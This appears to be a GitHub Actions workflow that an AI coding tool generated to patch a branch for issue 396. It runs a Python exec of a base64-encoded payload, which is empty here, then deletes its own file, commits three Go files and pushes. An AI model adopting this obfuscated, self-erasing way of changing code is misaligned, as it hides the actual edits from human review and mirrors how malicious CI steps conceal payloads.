name: Web GPT Issue 396 Integration Patch

on:
  push:
    branches:
      - web-gpt/issue-396-sol-review-evidence
    paths:
      - .github/workflows/web-gpt-396-integration-patch.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: web-gpt/issue-396-sol-review-evidence
      - name: Apply bounded integration fixes
        run: python3 -c "import base64; exec(base64.b64decode(''))"
      - name: Remove patch workflow and commit
        run: |
          rm .github/workflows/web-gpt-396-integration-patch.yml
          git config user.name shinderuman
          git config user.email shinderuman@gmail.com
          git add glm-worker/internal/state/parent_review_evidence.go glm-worker/internal/workflow/workflow.go glm-worker/internal/workflow/review_flow.go .github/workflows/web-gpt-396-integration-patch.yml
          git commit -m 'Fix Issue 396 review evidence integration'
          git push origin HEAD:web-gpt/issue-396-sol-review-evidence
